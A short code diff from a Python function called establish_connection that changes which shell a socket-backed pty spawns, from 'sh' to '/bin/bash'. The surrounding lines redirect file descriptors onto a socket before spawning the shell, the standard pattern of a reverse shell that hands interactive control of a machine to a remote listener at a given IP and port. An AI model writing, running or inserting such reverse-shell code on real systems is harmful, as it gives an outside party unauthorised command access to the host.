@@ -28,7 +28,7 @@ def establish_connection(ip, port):
             os.dup2(s.fileno(), 2)
 
             try:
-                pty.spawn("sh")
+                pty.spawn("/bin/bash")
             except Exception as shell_error:
                 print(f"Shell session ended: {shell_error}", file=sys.stderr)
             
